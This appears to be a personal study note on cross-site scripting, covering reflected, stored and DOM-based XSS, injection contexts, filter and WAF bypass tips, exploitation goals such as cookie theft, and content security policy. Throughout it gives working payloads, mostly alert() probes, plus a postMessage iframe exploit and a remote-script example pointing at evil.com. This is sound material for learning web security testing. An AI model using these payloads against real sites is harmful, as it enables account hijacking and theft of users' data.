# XSS

Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users

<details>

<summary>Do not use alert(1)</summary>

```html
<textarea id="script" onchange=("unsafe(this.value)"></textarea><br>
<iframe id="result" sandbox="allow-scripts allow-modals"></iframe>
```

```javascript
document.session = "secret"
function unsafe(t) {
  var i = document.getElementById('result'); // get the <iframe>
  i.srcdoc = "<body><script>document.write("+t+");<"+"/script><body>";
}
```

* Try `alert(1)` and you see it works... but
* `alert(document.session)` won't work... why?
* `alert(window.origin)` or `alert(document.domain)` and you'll see it's empty
  * this is because the sandboxed iframe also has a different origin. It's isolated from the website it is embedded into and you cannot steal the secret session.
* Use `alert(document.domain)` or `alert(window.origin)` instead

</details>

## <mark style="color:yellow;">**Reflected XSS**</mark>

The malicious script comes from the current HTTP request.

```
https://insecure-website.com/search?term=<script>alert(document.domain)</script>
```

## <mark style="color:yellow;">**Stored XSS**</mark>

The malicious script comes from the website's database. POST example:&#x20;

```
comment=<script>alert(document.domain)</script>
```

## <mark style="color:yellow;">**DOM-based XSS**</mark>

The vulnerability exists in client-side code rather than server-side code.

```html
<script>
function trackSearch(query) {
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
  trackSearch(query);
}
</script>
```

```sh
# Get request 
https://insecure-website.com/index?search="><script>alert(document.domain)</script>
```

**Methodology**

1. Look for any script that has a sinks
2. See if you can control the sink
3. Exploit it

{% hint style="success" %}
**Tips**:

1.  Here there are some sources and sinks

    https://github.com/wisec/domxsswiki/wiki

    https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities
2. DOM Invader (Burp Suite tool) is a browser-based tool that helps you test for DOM XSS vulnerabilities using a variety of sources and sinks.
{% endhint %}

### <mark style="color:yellow;">DOM-based web message</mark> <a href="#what-is-the-impact-of-dom-based-web-message-vulnerabilities" id="what-is-the-impact-of-dom-based-web-message-vulnerabilities"></a>

```html
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('test').innerHTML = e.data;
    })
</script>
```

Exploit

```html
<iframe src="https://vuln.website/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

### <mark style="color:yellow;">DOM XSS - Sources and sinks in third-party dependencies</mark>

### <mark style="color:yellow;">**in jQuery**</mark>

jQuery's `attr()` function can change the attributes of DOM elements

```javascript
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

Exploit

```
?returnUrl=javascript:alert(document.domain)
```

### <mark style="color:yellow;">Reflected/Stored DOM XSS</mark>

* If a script reads data from a URL and writes it to a dangerous sink, the vulnerability is client-side with no server processing.
* **Reflected DOM** vulnerabilities happen when the server processes and echoes data from a request, and a script on the page handles this data unsafely, writing it to a dangerous sink.

```javascript
eval('var data = "reflected string"');
```

* In a **stored DOM XSS** vulnerability, the server stores data from one request and includes it in a later response. A script in the later response processes this data unsafely in a sink.

```javascript
element.innerHTML = comment.author
```

## <mark style="color:yellow;">XSS contexts</mark>

### <mark style="color:yellow;">Between HTML tags</mark>

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

**Bypass WAF**

If you receive an error like "tag  is not allowed" or "event is not allowed", use XSS cheat sheet to discover a tag and event that work.

{% hint style="info" %}
**Note**: understand how a payload works

* `<body onresize="print()">` with this payload (for reflected XSS) you need an exploit server and iframe tag
{% endhint %}

### <mark style="color:yellow;">In HTML tag attributes</mark>

* When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.

```html
"><script>alert(document.domain)</script>
```

* More commonly in this situation, angle brackets are blocked or encoded. In this case you can introduce a new attribute that creates a scriptable context.

```html
" autofocus onfocus=alert(document.domain) x="
```

* Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. If the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script

```html
<a href="javascript:alert(document.domain)">
```

* Access keys allow you to provide keyboard shortcuts that reference a specific element. This is useful in hidden inputs because events like onmouseover and onfocus can't be triggered due to the element being invisible

```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```

```html
<link rel="canonical" accesskey="X" onclick="alert(1)" />
```

{% hint style="info" %}
Tips:

* Substitute `'` `"` and viceversa
* Space is not needed

```html
<link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>
```
{% endhint %}

```html
<link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>
```

### <mark style="color:yellow;">Into JavaScript</mark>

**Terminating the existing script** (I don't really know why this works but it works).&#x20;

The browser incorrectly interprets the `</script>` sequence within the string as the end of the script block, prematurely stopping the execution of your JavaScript script and generating an error.

```html
<script>
...
var input = 'controllable data here';
...
</script>
```

```html
<!-- Payload -->
</script><img src=1 onerror=alert(document.domain)>
```

***

Breaking out of a JavaScript string

* It's essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing

```javascript
'-alert(document.domain)-'
';alert(document.domain)//
```

* Some applications try to escape single quote characters with a backslash but often forget to escape the backslash itself.
  * `';alert(document.domain)//` is converted to `\';alert(document.domain)//`&#x20;
  * so your input could be `\';alert(document.domain)//` which gets converted to `\\';alert(document.domain)//`
* Making use of HTML-encoding
  * When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around input filters.
    * `<a href="#" onclick="... var input='controllable data here'; ...">`
    * `&apos;-alert(document.domain)-&apos;`
    * The browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted
    * HTML encode: https://html.spec.whatwg.org/multipage/named-characters.html
    * Note: you cannot use `&quot;` -> `"` to close onclick attribute. Remember: The browser HTML-decode the value of the onlick attribute but not the entire structure
* XSS in JavaScript template literals
  * JavaScript template literals are string literals that allow embedded JavaScript expressions (Template literals are encapsulated in backticks)

```html
<script>
...
var input = `controllable data here`;
...
</script>
${alert(document.domain)}
```

### <mark style="color:yellow;">Via client-side template injection</mark>

To do

## <mark style="color:yellow;">Exploitation</mark>

* Exploiting XSS to **steal cookies** and send the victim's cookies to your own domain
  * Limitation:
    * The victim might not be logged in.
    * Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
    * Sessions might be locked to additional factors like the user's IP address.
    * The session might time out before you're able to hijack it.
* Exploiting XSS to **capture passwords**
* Exploiting XSS to **perform CSRF**
  * When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.
  * If the site use a token you can get it doing a first request and then add the token in a second request

## <mark style="color:yellow;">Content security policy</mark>

CSP restrit the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages

CSP defends against XSS attacks in the following ways

* Restricting Inline Scripts
  * `<script>document.body.innerHTML='defaced'</script>` will not work
* Restricting Remote Scripts
  * `<script src="https://evil.com/hacked.js"></script>` will not work
* Restricting Unsafe JavaScript
* Others https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html
